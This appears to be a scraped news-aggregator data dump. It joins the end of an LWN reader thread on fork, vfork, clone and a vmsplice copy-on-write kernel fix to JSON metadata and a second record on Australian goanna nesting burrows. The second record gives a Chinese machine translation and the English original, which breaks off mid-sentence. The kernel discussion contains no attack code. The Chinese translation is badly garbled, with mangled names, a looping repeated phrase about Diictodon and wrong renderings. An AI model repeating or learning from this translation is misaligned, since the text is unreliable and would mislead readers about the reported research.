the raw clone() system call  &gt; accepts NULL as a stack argument (and clone3() likewise allows  &gt; cl_args.stack to be NULL). In this case, the child uses a  &gt; duplicate of the parent&#39;s stack. (Copy-on-write semantics ensure  &gt; that the child gets separate copies of stack pages when either  &gt; process modifies the stack.) In this case, for correct  &gt; operation, the CLONE_VM option should not be specified. (If the  &gt; child shares the parent&#39;s memory because of the use of the  &gt; CLONE_VM flag, then no copy-on-write duplication occurs and chaos  &gt; is likely to result.)  That sounds like it would be fun to debug. Now I&#39;m wondering if any developers have decided that they &#34;need to&#34; bypass glibc and pull this sort of chicanery on any of my systems... (I&#39;m an SRE, so if it broke in production, it would be my problem to fix it). &#34;Fortunately,&#34; most of the bugs I&#39;ve seen have tended to be higher-level than this, but it&#39;s still a bit frightening that the kernel will just let you do something like that.  * Which is obviously not going to happen given the kernel&#39;s fanatical devotion to not breaking userspace, but let&#39;s pretend for a moment.\n Posted Mar 23, 2021 10:08 UTC (Tue) by  pbonzini ( \u272d supporter \u272d, #60935) [ Link]\n  posix_spawn() is not a single system call (technically both fork() and vfork() are wrappers around clone(2), but at least the latter is a single system call).\n Well sure, but in the (absurd) hypothetical where we&#39;re eliminating COW, the kernel would presumably need to grow an interface with capabilities similar to fork+exec, and the POSIX standard name for that interface is posix_spawn.\n Posted Mar 23, 2021 23:00 UTC (Tue) by  Cyberax ( \u272d supporter \u272d, #52523) [ Link]\n  Apparently, people dislike posix_spawn. Perhaps we would grow a full replacement that would allow to create a suspended process, tweak its attributes (using file handle-based API) and then resume it.  But I feel what we might actually get is a io_uring-based API that does this using BPF.\n We _almost_ have that api already: ptrace.  Minor problem being that ptrace is really awful. It&#39;s too bad the proposals to add a saner handle based version have all died off.\n  A couple of years ago we discussed this paper, which argues that fork() is fundamentally the wrong primitive to build OS process management around:  https://lwn.net/Articles/785430/\n  Posted Mar 23, 2021 14:17 UTC (Tue) by  abatters ( \u272d supporter \u272d, #6932) [ Link]\n  I considered using vfork() recently, but ultimately decided against it after encountering too many warnings about it. For example, see the history of glibc using vfork() for posix_spawn():  glibc &lt;= 2.23: posix_spawn() uses vfork() if POSIX_SPAWN_USEVFORK is set or if there is no cleanup expected in the child before it exec(3)s the requested file. However, this implementation of vfork() was the source of a number of bugs.  Linux glibc &gt;= 2.24: glibc commit 9ff72da471a509a8c19791efe469f47fa6977410 posix_spawn() switches from vfork() to clone(CLONE_VM | CLONE_VFORK) which uses a separate stack for the child. This fixes a number of vfork()-related bugs (&#34;possible parent clobber due stack spilling&#34;), making it possible to enable by default and ignore POSIX_SPAWN_USEVFORK.  recent non-Linux glibc glibc commit ccfb2964726512f6669fea99a43afa714e2e6a80 POSIX_SPAWN_USEVFORK is ignored and regular fork() is always used, due to difficulties getting vfork() to work without the Linux-specific clone() semantics.  Note that using clone(CLONE_VM | CLONE_VFORK) safely requires blocking all signals, including NPTL-internal signals. But the glibc wrappers don&#39;t let you block NPTL-internal signals, making it much more difficult to do outside of glibc. See the glibc implementation for all the gory details.\n  Na\u00efve non-kernel-developer perspective: this seems _intuitively_ like the wrong solution to the problem. The child still has access to the page, so surely it should still be marked as having access to that page as long as it does indeed have a reference to it, rather than pretending it doesn&#39;t have access to the page just because it&#39;s been munmap&#39;d. Just because the page has been munmap&#39;d doesn&#39;t mean that the process can&#39;t read from it, so why is the page table entry removed? I assume there&#39;s a very good reason why it&#39;s done this way, though. Could someone clear up my misunderstanding?\n &gt; The child still has access to the page, so surely it should still be marked as having access to that page as long as it does indeed have a reference to it, rather than pretending it doesn&#39;t have access to the page just because it&#39;s been munmap&#39;d.  I&#39;m not sure I understand your point, but that problem is prevented by the commit. When the child wants to take that extra reference (for vmsplice()) it gets a copy instead of the page shared with the parent. Afterwards both the page tables of the child and the reference held by the pipe point to this new copy, and the access to parent&#39;s page is lost.  &gt; Just because the page has been munmap&#39;d doesn&#39;t mean that the process can&#39;t read from it, so why is the page table entry removed?  That&#39;s simply the semantic of munmap() - it has to adjust the VMA tree and zap page table entries so that the munmapped range is no longer represented there. Then if the process tries to read/write to an address within the area, it segfaults. We can&#39;t leave the page table entry there just because another reference exists. The read from the pipe doesn&#39;t go through these page tables.\n As a non-kernel developer, I&#39;m curious:  In retrospect, is this COW breaking fundamentally wrong? Why not treat vmsplice reference &#34;as references&#34;? Is is possible to make the page inaccessible to the userspace process after munmap while still keep the kernel&#39;s reference?\n In principle yes, but then you have other problems.  For example, mmap can be used to allocate memory at a fixed address. It can be difficult to tell whether any given address is suitable (because other pages etc. might be in the way), but if you had just munmapped it, it would be really weird for a subsequent mmap of the same address and size to fail. Userspace might assume that it doesn&#39;t need to check the error code for mmap in that case (or it might not have suitable recovery code, and just call abort(3)).  So now your solution needs to accommodate stacking a new page on top of the hidden page, or relocating the hidden page, either of which is nontrivial. That&#39;s not even mentioning the fact that you need to teach vmsplice to track per-process references in the same way as pages do, without that page actually existing in the userspace page map. These are all rather difficult problems to solve, and this is a security issue, so solving hard problems is not the ideal form of a fix. Throwing in a simple COW break is a much more straightforward solution (but, as the story alludes, there was presumably some complication which they failed to account for).\n &gt; if you had just munmapped it, it would be really weird for a subsequent mmap of the same address and size to fail. Userspace might assume that it doesn&#39;t need to check the error code for mmap in that case (or it might not have suitable recovery code, and just call abort(3)).  That reminds me of an old bug: About a decade ago, Firefox (using code from jemalloc) would try to do a large aligned allocation like &#34;p = mmap(NULL, size*2); munmap(p); p = mmap(round_up(p, alignment), size);&#34; i.e. using the first mmap+munmap to discover a large-enough hole in the address space, then allocating at a correctly-aligned address within that hole. If the second mmap didn&#39;t return the address that was requested, there must have been a race condition with another thread that allocated in the same hole, so it would loop around and try again and hope for better luck next time.  That worked okay until it ran on kernels with a security feature that randomised mmap and entirely ignored the address parameter (which is technically okay since it&#39;s defined as just a hint, not a requirement), so the code got stuck in an infinite loop.  That was fixed ages ago, but it does seem plausible that some userspace code may still make similarly unwise assumptions.\n  The PTE has to go away because that&#39;s what munmap() is specified to do. Furthermore, the fact that it&#39;s t\n......", "posttime": "2021-06-26 16:41:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u76f4\u5230,cows,vfork", "title": "\u4fee\u8865\uff0c\u76f4\u5230\u5976\u725b\u56de\u5bb6 ", "title_en": "Patching until the COWs come home", "transed": 1, "url": "https://lwn.net/Articles/849638/", "via": "", "real_tags": ["\u76f4\u5230", "cows", "vfork"]}, {"category": "", "categoryclass": "", "imagename": "f2f261ee9b23f9cbef78336888cc285f.jpg", "infoid": 1068404, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7ecf\u8fc7\u8bb8\u591a\u8d8a\u6765\u8d8a\u591a\u7684\u94f2\u5b50\u5728\u70e7\u7126\u7684\u6fb3\u5927\u5229\u4e9a\u9633\u5149\u4e0b\u7684\u6c61\u57a2\u65f6\uff0c\u8096\u6069\u5076\u50cf\u5f00\u59cb\u8ba4\u4e3a\u4ed6\u5df2\u7ecf\u4ee4\u4eba\u5c34\u5c2c\u7684\u9519\u8bef\uff0c\u5e76\u4e14\u662f - \u975e\u5e38\u5b57\u9762\u4e0a\u6316\u6398\u81ea\u5df1\u7684\u6d1e\u3002\n Doody\u662f\u5357\u4f5b\u7f57\u91cc\u8fbe\u5927\u5b66\u7684\u722c\u866b\u5b66\u5bb6\uff0c\u4ed6\u4eec\u5171\u5ea6\u7814\u7a76\u4e86\u6fb3\u5927\u5229\u4e9a\u9ec4\u8272\u6591\u70b9\u7684Goanna-A\u6355\u98df\u8005\u76d1\u89c6\u5668\u8725\u8734\uff0c\u957f\u722a\uff0c\u4e00\u4e2a\u97ad\u72b6\u7684\u5c3e\u5df4\u548c\u873f\u8712\u7684\u808c\u8089\u673a\u8eab\uff0c\u53ef\u4ee5\u8fbe\u52305\u82f1\u5c3a\u7684\u957f\u5ea6\u3002\u5b83\u7684\u8303\u56f4\u4e0e\u6b27\u6d32\u4e00\u6837\u5927\uff0c\u4f46\u542b\u6709300\u4e07\u4eba\uff0c\u6240\u4ee5\u5c3d\u7ba1\u5927\u5c0f\uff0c\u5f88\u5c11\u89c1\uff0c\u4ecd\u7136\u662f\u795e\u79d8\u7684\u3002\u76f4\u5230\u6700\u8fd1\uff0c\u4f8b\u5982\uff0c\u6ca1\u6709\u4eba\u77e5\u9053\u5b83\u5728\u54ea\u91cc\u5960\u5b9a\u4e86\u9e21\u86cb\u3002 Doody\u8c08\u5230\u4e86\u539f\u59cb\u7684\u6fb3\u5927\u5229\u4e9a\u4eba\uff0c\u4ed6\u4eec\u7ecf\u5e38\u6355\u6349\u6000\u5b55\u7684\u5973\u6027\uff0c\u9644\u8fd1\u770b\u8d77\u6765\u50cf\u6d1e\u7a74\u5165\u53e3\u3002 \u201c\u4f46\u6bcf\u6b21\u6709\u4eba\u8bd5\u56fe\u5230\u8fbe\u65f6\uff0c\u4ed6\u4eec\u90fd\u4f1a\u9760\u8fd1\u4ed6\u4eec\u7684\u80a9\u8180\u5e76\u51fb\u4e2d\u6b7b\u53bb\u7684\u7ec8\u70b9\uff0c\u201d\u4ed6\u544a\u8bc9\u6211\u3002\n \u4ed6\u57282012\u5e74\u53d1\u73b0\u4e86\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u5f53\u4ed6\u548c\u56db\u4e2a\u540c\u4e8b\u6316\u5230\u4e86\u4e00\u4e2a\u52a0\u5165\u52c7\u6562\u7684\u6d1e\u7a74\u3002\u4ece\u8868\u9762\uff0c\u5728\u7a81\u7136\u505c\u6b62\u4e4b\u524d\uff0c\u96a7\u9053\u4ec5\u7565\u5fae\u5bbd\u8f83\u5bbd\u7684\u808c\u8089\u4e0b\u964d\u7ea6\u4e24\u82f1\u5c3a\u3002\u4f46\u662f\uff0c\u5f53Doody\u4ea4\u6613\u4ed6\u7684\u94f2\u5b50\u52fa\u5b50\u65f6\uff0c\u8f7b\u8f7b\u5730\u63a8\u52a8\u66b4\u9732\u7684\u6c61\u57a2\uff0c\u4ed6\u610f\u8bc6\u5230\u96a7\u9053\u7684\u672b\u7aef\u6bd4\u5176\u5899\u58c1\u7565\u5fae\u67d4\u8f6f\u3002\u8fd9\u610f\u5473\u7740\u6d1e\u7a74\u6bd4\u4f3c\u4e4e\u66f4\u6df1;\u521b\u9020\u5b83\u7684\u52a0\u6cd5\u8005\u5df2\u7ecf\u7528\u571f\u58e4\u56de\u586b\u3002\u6709\u8da3\u7684\uff0c\u505a\u7684\uff0c\u4ed6\u7684\u56e2\u961f\u6316\u5f97\u66f4\u6df1\u3002\n \u5f53\u4ed6\u4eec\u4e09\u82f1\u5c3a\u4e0b\u6765\u65f6\uff0c\u6ca1\u6709\u4efb\u4f55\u4e1c\u897f\u53ef\u4ee5\u5c55\u793a\u4ed6\u4eec\u7684\u52aa\u529b\uff0cDoody\u5f88\u56f0\u60d1\u3002\u5f53\u5927\u591a\u6570\u722c\u884c\u52a8\u7269\u57cb\u5165\u5375\u5b50\u65f6\uff0c\u5b83\u4eec\u5728\u8868\u9762\u4e0b\u9762\u5c11\u4e8e\u4e00\u82f1\u5c3a\u3002\u751a\u81f3\u5927\u6d77\u9f9f\u6316\u6398\u6d45\u5de2\u3002\u4f46\u662f\u56de\u586b\u7684Goanna Burrow\u4e00\u76f4\u5f85\u547d\u3002\u964c\u751f\u4eba\u4ecd\u7136\uff0c\u5b83\u7684\u9053\u8def\u5f00\u59cb\u626d\u66f2\uff0c\u5f00\u74f6\u5668\u4e0b\u964d\u3002 \u201c\u6211\u7684\u4f34\u4fa3\uff0c\u4e5f\u662f\u722c\u866b\u533b\u751f\uff0c\u5728\u7535\u8bdd\u4e0a\uff0c\u8bf4\uff0c\u201d\u4f60\u77e5\u9053\uff0c\u8096\u6069\uff0c\u722c\u884c\u52a8\u7269\u4e0d\u4f1a\u6df1\u6df1\u5730\u6316\u6398\uff0c\u201c\u4ed6\u544a\u8bc9\u6211\u3002 \u201c\u6211\u5f00\u59cb\u6000\u7591\u81ea\u5df1\u3002\u201d\n \u5728\u4e94\u82f1\u5c3a\u7684\u4e0b\u6765\uff0c\u5728\u6316\u6398\u7684\u7b2c\u4e8c\u5929\uff0cDoody\u5728\u4ed6\u4eec\u4e2d\u7684\u4e00\u4e2a\u4eba\u7684\u65f6\u5019\u5bf9\u4ed6\u7684\u540c\u4e8b\u4eec\u7cbe\u795e\u4e0a\u64b0\u5199\u9053\u6b49\uff0c\u4ed6\u7684\u5934\u4e0a\u8eba\u5728\u5730\u4e0a\uff0c\u4ed6\u7684\u624b\u81c2\u8737\u7f29\u5728\u87ba\u65cb\u6d1e\u7a74\uff0c\u5c16\u53eb\u7740\uff0c\u201c\u86cb\uff01\u201d Doodod\u548c\u4ed6\u7684\u56e2\u961f\u7ec8\u4e8e\u627e\u5230\u4e86\u4e00\u4e2a\u5de2\u7a74;\u4ece\u4e2d\uff0c\u4ed6\u4eec\u62d4\u51fa\u4e8610\u4e2a\u9e21\u86cb\uff0c\u5b8c\u6574\u3002\n \u4ece\u90a3\u4ee5\u540e\uff0c\u8be5\u56e2\u961f\u5206\u6790\u4e86\u51e0\u5341\u4e2aGOANNA BOUROWS\uff0c\u6240\u6709\u8fd9\u4e9b\u90fd\u6709\u76f8\u540c\u7684\u7cbe\u5fc3\u5236\u4f5c\u7ed3\u6784\u3002\u51e0\u53ea\u52a8\u7269\u4e5f\u6316\u6398\uff08\u6216\u6316\u6398\uff09\u87ba\u65cb\u6316\u6d1e\uff0c\u5305\u62ec\u874e\u5b50\uff0c\u53e3\u888b\u8e29\u8e0f\u8005\uff0c\u4e00\u4e2a\u540d\u4e3a\u53e4\u4ee3\u622a\u6b62\u8005\u7684\u706d\u7edd\u6d77\u85fb\uff0c\u4ee5\u53ca\u53eb\u505a\u526f\u722c\u884c\u52a8\u7269\u7684\u54fa\u4e73\u52a8\u7269\uff0c\u79f0\u4e3aDiictodon\uff0c\u8fd9\u4e9b\u722c\u884c\u52a8\u7269\u88ab\u79f0\u4e3aDiictodon\uff0c\u8fd9\u4e9b\u722c\u884c\u52a8\u7269\u88ab\u79f0\u4e3aDiictodon\uff0c\u8fd9\u4e9b\u722c\u884c\u52a8\u7269\u662fDiictodon\uff0c\u8fd9\u4e9b\u722c\u884c\u52a8\u7269\u662fDiictodon\uff0c\u8fd9\u662f25500\u4e07\u5e74\u524d\u7684Diictodon\u3002\u4f46\u9ec4\u8272\u6591\u70b9\u7684Goanna\u7684\u5de2\u7a74\u6bd4\u6240\u6709\u8fd9\u4e9b\u751f\u7269\u7684\u5de2\u7a74\u66f4\u6df1\u5165\u5230\u5ef6\u4f38\u5230\u8868\u9762\u4e0b\u65b9\u768413\u82f1\u5c3a\u3002 \u201c\u8fd9\u662f\u4e00\u4e2a\u8352\u8c2c\u7684\u6df1\u5ea6\uff0c\u201dDoody\u544a\u8bc9\u6211\u3002\u4ed6\u8ba4\u4e3a\u9ec4\u8272\u6591\u70b9\u7684\u52a0\u6cd5\u8005\u9762\u4e34\u7740\u72ec\u7279\u7684\u6311\u6218\u3002\u5b83\u7684\u5927\u9e21\u86cb\u9700\u8981\u5728\u5b75\u5316\u524d8\u4e2a\u6708\u5b75\u80b2 - \u4e00\u4e2a\u65f6\u671f\uff0c\u901a\u8fc7\u6fb3\u5927\u5229\u4e9a\u7684\u6b8b\u9177\u65f1\u5b63\uff0c\u5f53\u65f6\u51e0\u4e2a\u6708\u53ef\u80fd\u5728\u6ca1\u6709\u4efb\u4f55\u96e8\u7684\u60c5\u51b5\u4e0b\u624d\u80fd\u3002\u5728\u6d45\u5c42\u6df1\u5ea6\uff0c\u9e21\u86cb\u4f1a\u716e\u719f\u548c\u5e72\u71e5\u3002\u53ea\u6709\u5728\u66f4\u6df1\u7684\u571f\u58e4\u4e2d\uff0c\u5b83\u4eec\u5374\u8f83\u51b7\uff0c\u6e7f\u6da6\uff0c\u5b83\u4eec\u662f\u5426\u53ef\u4ee5\u5b58\u6d3b\u3002\n  \u4e3a\u4e86\u521b\u9020\u5979\u7cbe\u5fc3\u5236\u4f5c\u7684\u6d1e\u7a74\uff0c\u4e00\u4e2a\u9884\u671f\u7684\u5973\u6027\u6b4c\u963f\u9996\u5148\u6316\u51fa\u4e24\u82f1\u5c3a\u7684\u571f\u58e4\uff0c\u5e76\u5728\u9644\u8fd1\u7684\u571f\u58a9\u4e2d\u5806\u79ef\u3002\u7136\u540e\u5979\u6709\u6548\u5730\u5411\u4e0b\u6e38\u6cf3\uff0c\u7528\u6b63\u9762\u817f\u6316\u6398\uff0c\u540c\u65f6\u5c06\u677e\u6563\u7684\u6c99\u5b50\u79fb\u52a8\u5230\u5979\u8eab\u540e\u7684\u677e\u6563\u6c99\u5b50\u4ee5\u56de\u586b\u5979\u521b\u9020\u7684\u96a7\u9053\u3002\u8fd9\u9700\u8981\u51e0\u5929\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u5979\u88ab\u5305\u88f9\u5728\u571f\u58e4\u4e2d\u5e76\u88ab\u8db3\u591f\u7684\u7a7a\u6c14\u5305\u56f4\u3002 \u201c\u6211\u4eec\u5728\u8fd9\u4e2a\u884c\u4e3a\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a\uff0c\u5979\u5728\u90a3\u91cc\u7559\u4e0b\u4e86\u4e00\u4e2a\u571f\u8c46\uff0c\u201dDoofy\u544a\u8bc9\u6211\u3002\u8fd9\u53ef\u80fd\u662f\u5979\u5728\u5f00\u74f6\u5668\u4e2d\u79fb\u52a8\u7684\u539f\u56e0\uff0c\u4ed6\u8865\u5145\u8bf4\uff1a\u201c\u4efb\u4f55\u6454\u5012\u7684\u6c99\u5b50\u88ab\u5979\u7684\u8eab\u4f53\u963b\u6321\u4e86\uff0c\u4e8b\u5b9e\u662f\u5979\u8f6c\u5411\u7684\u4e8b\u5b9e\u3002\u201d\u4e00\u65e6\u5979\u5230\u8fbe\u6b63\u786e\u7684\u6df1\u5ea6\uff0c\u5979\u5c31\u6316\u4e86\u4e00\u4e2a\u5f00\u653e\u5f0f\u95ed\u5408\u62f3\u7684\u5c3a\u5bf8\u3002\u5979\u6492\u4e0a\u5979\u7684\u9e21\u86cb\uff0c\u7136\u540e\u6316\u51fa\u5979\u7684\u65b9\u5f0f\uff0c\u5728\u5979\u9996\u6b21\u6df9\u6ca1\u540e\u4e03\u523010\u5929\u3002 \n\u51e0\u4e2a\u6708\u540e\uff0c\u5f53\u5a74\u513f\u9175\u6bcd\u5b75\u5316\u65f6\uff0c\u4ed6\u4eec\u5ffd\u7565\u4e86\u4ed6\u4eec\u6bcd\u4eb2\u7684\u87ba\u65cb\u6d1e\u3002\u76f8\u53cd\uff0c\u4ed6\u4eec\u81ea\u5df1\u51fa\u53bb\u4e86\uff0c\u76f4\u884c\u5411\u4e0a\u522e\u4f24\u3002 \u201c\u6d77\u9f9f\u4e0d\u5f97\u4e0d\u6316\u6398\u6f02\u4eae\uff0c\u677e\u6563\u7684\u6c99\u5b50\uff0c\u6709100\u4e2a\uff0c\u201dDoofy\u8bf4\u3002 \u201c\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u80fd\u6709\u516b\u4e2a\u5b75\u5316\u8725\u8734\u7ecf\u8fc7\u7c73\u7684\u6297\u6027\u571f\u58e4\u3002\u201d\n Goanna Burrows\u4e0d\u4f1a\u7a00\u758f\u5206\u5e03\u3002\u8bb8\u591a\u8fd9\u4e9b\u8725\u8734\u7b51\u5de2\uff0c\u521b\u9020\u4e86\u5927\u578b\u516c\u5171\u6c83\u6717\u3002\u8be5\u56e2\u961f\u66fe\u7ecf\u53d1\u73b0\u8fc7100\u591a\u4e2a\u5355\u72ec\u7684\u79bb\u5408\u5668\uff0c\u5c0f\u578b\u5ba2\u5385\u7684\u5927\u5c0f\u3002\u7814\u7a76\u4eba\u5458\u7684\u91cd\u5efa\u662f\u4e00\u4e2a\u5145\u6ee1\u7d27\u5bc6\u5305\u88c5\u7684\u7ebf\u5708\u7684\u5f39\u7c27\u5e8a\u57ab\u3002 Goannas\u5728\u5e74\u590d\u4e00\u5e74\u540e\u91cd\u590d\u4f7f\u7528\u4e86\u8fd9\u4e9b\u7f51\u7ad9\uff0c\u5e76\u4e14\u968f\u7740\u5355\u72ec\u7684\u6d1e\u7a74\u5408\u5e76\uff0c\u6298\u53e0\u548c\u4fb5\u8680\uff0c\u6c83\u4f26\u6210\u4e3a\u5145\u6ee1\u5f00\u653e\u7a7a\u95f4\u7684\u590d\u6742\u8ff7\u5bab\u3002\n \u8fd9\u4e9b\u804c\u4f4d\u7a7a\u7f3a\u957f\u671f\u4ee5\u6765\u4e0d\u4f1a\u7559\u7a7a\u3002 Doody\u7684\u56e2\u961f\u53d1\u73b0\u4e86\u4e00\u4e2a\u4e0d\u540c\u7684\u52a8\u7269\u52a8\u7269\u5e87\u62a4\u548c\u7b51\u5de2\u5728Goanna Bourrows\u4e2d\u3002\u8fd9\u4e9b\u5305\u62ec\u5176\u4ed6\u8725\u8734\uff0c\u86c7\uff0c\u874e\u5b50\uff0c\u8708\u86a3\uff0c\u7532\u58f3\u866b\uff0c\u8682\u8681\u548c\u79f0\u4e3a\u8102\u80aa\u5c3e\u7684\u5047\u7532\u7d20\u7684\u9f20\u674e\u6ce5\u6d46\u3002\u8bb8\u591a\u9752\u86d9\u901a\u8fc7\u5c06\u81ea\u5df1\u57cb\u5728\u56de\u586b\u7684\u6d1e\u7a74\u7684\u677e\u6563\u571f\u58e4\u4e2d\u5fcd\u53d7\u4e86\u65f1\u5b63\u3002 \u201c\u5f53\u6211\u4eec\u62d4\u51fa\u56de\u586b\u65f6\uff0c\u6211\u4eec\u4e00\u904d\u53c8\u4e00\u904d\u5730\u62d4\u51fa\u51e0\u4e2a\u9752\u86d9\uff0c\u201dDoody\u544a\u8bc9\u6211\u3002\u5728\u4e00\u4e2a\u6c83\u4f26\uff0c\u4ed6\u548c\u4ed6\u7684\u540c\u4e8b\u53d1\u73b0\u4e86418\u86d9\u3002 \u201c\u4f9d\u6258\u8fd9\u4e9b\u6d1e\u7a74\u7684\u5176\u4ed6\u52a8\u7269\u7684\u7eaf\u7cb9\u6570\u91cf\u548c\u5404\u79cd\u5404\u6837\u7684\u4eba\u7269\u662f\u4ee4\u4eba\u60ca\u8bb6\u7684\uff0c\u201d\u535a\u7269\u9986\u7ef4\u591a\u5229\u4e9a\u5dde\u7ef4\u591a\u5229\u4e9a\u5dde\u7684\u7b56\u5c55\u4ebaJane Melville\u544a\u8bc9\u6211\u3002\n  Goannas\u901a\u5e38\u88ab\u79f0\u4e3a\u9876\u7ea7\u6355\u98df\u8005\uff0c\u8fd9\u4e9b\u6355\u98df\u8005\u5c06\u5403\u4efb\u4f55\u4e1c\u897f\uff0c\u4ee5\u53ca\u4ed6\u4eec\u53ef\u4ee5\u7ba1\u7406\u7684\u4e00\u5207\u3002\u4f46\u662fDoodod\u7684\u5de5\u4f5c\u8868\u660e\uff0c\u4ed6\u4eec\u521b\u9020\u4e86\u548c\u200b\u200b\u6bc1\u706d\u3002\u5b83\u4eec\u5f88\u5bb9\u6613\u88ab\u89c6\u4e3a\u751f\u6001\u7cfb\u7edf\u5de5\u7a0b\u5e08 - \u4ee5\u65e8\u5728\u4e3a\u4ed6\u4eec\u7684\u751f\u7269\u521b\u9020\u673a\u4f1a\u7684\u65b9\u5f0f\u6765\u4fee\u6539\u4ed6\u4eec\u7684\u73af\u5883\u3002\u6d77\u72f8\uff08\u5927\u575d\u6cb3\uff09\uff0c\u73ca\u745a\uff08\u521b\u9020\u7901\u77f3\uff09\u548c\u5544\u6728\u9e1f\uff08\u6811\u6728\u7684\u94bb\u5b54\uff09\u90fd\u662f\u751f\u6001\u7cfb\u7edf\u5de5\u7a0b\u5e08\u3002\u4f46\u9664\u4e86\u51e0\u79cd\u4e4c\u9f9f\u548c\u9f9f\uff0c\u722c\u884c\u52a8\u7269\u5f88\u5c11\u88ab\u8ba4\u4e3a\u662f\u4ed6\u4eec\u7684\u961f\u4f0d\u3002 \u201c\u6211\u8ba4\u4e3a\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u4ed6\u4eec\u7684\u7ecf\u5e38\u6d88\u6781\u7684\u516c\u4f17\u611f\u77e5\uff0c\u201dCurtin\u5927\u5b66\u7684\u722c\u866b\u5b66\u5bb6Sophie Cross\u544a\u8bc9\u6211\u3002 \u201c\u722c\u884c\u52a8\u7269\u4e0d\u88ab\u89c6\u4e3a\u9b45\u529b\u3002\u4ed6\u4eec\u53d1\u6325\u7740\u91cd\u8981\u7684\u751f\u6001\u89d2\u8272\uff0c\u4f46\u8fd9\u4e9b\u5e76\u4e0d\u5e7f\u6cdb\u522b\u540d\u3002\u201c\n \u4f8b\u5982\uff0c\u9ec4\u8272\u5bdf\u89c9\u7684\u52a0\u5170\u65af\u5728\u5317\u5317\u90e8\u5927\u90e8\u5206\u5730\u533a\u53d1\u73b0\uff0c\u8fd9\u4f7f\u5176\u6210\u4e3a\u4e00\u4e2a\u201c\u5de8\u5927\u7684\u91cd\u8981\u6027\u201d\u7684\u5de5\u7a0b\u5e08\uff0c\u201c\u6885\u5c14\u7ef4\u5c14\u8bf4\u3002 Doody\u8ba4\u4e3a\u5176\u4ed6Goan\u200b\u200bna\u79cd\u4e5f\u91cd\u5851\u6fb3\u5927\u5229\u4e9a\u7684\u666f\u89c2\uff0c\u5305\u62ec\u8be5\u56fd\u6700\u5927\u7684\u8725\u8734 - \u516b\u82f1\u5c3a\u957f\u7684\u53d7\u9650\u3002\u4ed6\u7684\u5b66\u751fKari Soennichsen\u4e00\u76f4\u5728\u653e\u5c04\u7ebf\u8ddf\u8e2a\u8fd9\u4e9b\u52a8\u7269\uff0c\u4ee5\u4e86\u89e3\u4ed6\u4eec\u7684\u5375\u5b50\u5728\u54ea\u91cc\u4ee5\u53ca\u5982\u4f55\u541e\u566c\u4ed6\u4eec\u7684\u9e21\u86cb\u3002 \u201c\u8fd9\u4e00\u76f4\u5f88\u60b2\u60e8\uff0c\u8bd5\u56fe\u627e\u5230\u8fd9\u4e9b\u5bb6\u4f19\u7684\u5de2\u7a74\uff0c\u201dDoody\u8bf4\u3002 \u201c\u4ed6\u4eec\u662f\u79d8\u5bc6\u7684\uff0c\u4f60\u5fc5\u987b\u4e00\u76f4\u90fd\u5728\u4ed6\u4eec\u8eab\u8fb9\u3002\u201d\u53bb\u5e74\uff0c\u968f\u7740\u56e2\u961f\u6b63\u51c6\u5907\u53e6\u4e00\u4e2a\u91ce\u5916\u5b63\u8282\uff0c\u201cCovid\u771f\u7684\u8e22\u4e86\u6211\u4eec\u5728\u5c41\u80a1\u4e0a\u3002\u201d\n \u4ed6\u4eec\u4e0d\u80fd\u6c38\u8fdc\u7b49\u5f85\u3002 1935\u5e74\uff0c\u7518\u8517\u87fe\u870d\u88ab\u6beb\u4e0d\u7f9e\u4e8e\u4ecb\u7ecd\u7ed9\u6fb3\u5927\u5229\u4e9a\uff0c\u4e00\u76f4\u6162\u6162\u5730\u4f20\u64ad\u4e86\u8be5\u56fd\u7684\u5317\u90e8\u5730\u533a\uff0c\u4ed6\u4eec\u7684\u6bd2\u6027\u5206\u6ccc\u7269\u662f\u9057\u5631\u7684\u9057\u5631\uff0c\u5305\u62ec\u9ec4\u8272\u6591\u70b9\u7684\u96f7\u7eb3\u65af\u3002\u5728\u67d0\u4e9b\u5730\u533a\uff0c\u8725\u8734\u7684\u6570\u91cf\u5df2\u4e0b\u964d\u4e8690\uff05\u3002 Doody\u5f00\u59cb\u5b66\u4e60\u8fd9\u4e9b\u7269\u79cd\u6765\u5b66\u4e60\u5176\u5931\u8e2a\u7684\u540e\u679c\uff0c\u800c\u4ed6\u7684\u7b54\u6848\u6bd4\u4ed6\u9884\u671f\u7684\u66f4\u4ee4\u4eba\u60ca\u8bb6\u548c\u9677\u5165\u56f0\u5883\u3002\u968f\u7740Goannas\u6d88\u5931\uff0c\u4ed6\u4eec\u521b\u9020\u7684\u5730\u4e0b\u4e16\u754c\u4e5f\u662f\u5982\u6b64\u3002 ", "note_en": "After many futile hours of shoveling dirt under the scorching Australian sun, Sean Doody began to think that he had made an embarrassing mistake and was\u2014quite literally\u2014digging himself into a hole.\n Doody is a herpetologist from the University of South Florida who has spent years studying Australia\u2019s yellow-spotted goanna\u2014a predatory monitor lizard with long claws, a whiplike tail, and a sinuous, muscular body that can reach five feet in length. Its range is as large as Europe but contains just 3 million people, so despite the goanna\u2019s size, it is seldom seen and remains mysterious. Until recently, for example, no one knew where it laid its eggs. Doody spoke to Aboriginal Australians who would often catch pregnant females near what looked like burrow entrances. \u201cBut every time someone tried to reach in, they\u2019d get up to their shoulder and hit a dead end,\u201d he told me.\n He found the same thing in 2012, when he and four colleagues dug into a goanna burrow themselves. From the surface, a tunnel that was only slightly wider than a muscular arm descended for about two feet before abruptly stopping. But when Doody traded his shovel for a spoon and gently pushed against the exposed dirt, he realized that the tunnel\u2019s end was slightly softer than its walls. That meant the burrow was deeper than it seemed; the goanna that had created it had backfilled it with soil. Intrigued, Doody and his team dug deeper.\n By the time they were three feet down, with nothing to show for their efforts, Doody was confused. When most reptiles bury their eggs, they do so less than a foot beneath the surface. Even big sea turtles dig shallow nests. But the backfilled goanna burrow kept going. Stranger still, its path began to twist, corkscrewing as it descended. \u201cMy partner, who is also a herpetologist, was on the phone, saying, \u2018You know, Sean, reptiles don\u2019t dig that deep,\u2019\u201d he told me. \u201cI was starting to doubt myself.\u201d\n At five feet down, on the second day of digging, Doody was mentally composing an apology to his colleagues when one of them, lying flat on the ground with his head out of sight and his arm curled down the spiraling burrow, screamed out, \u201cEGGS!\u201d Doody and his team had finally found a nest; from it, they  pulled out 10 eggs, all intact.\n Since then, the team  has analyzed dozens of goanna burrows, all of which had the same 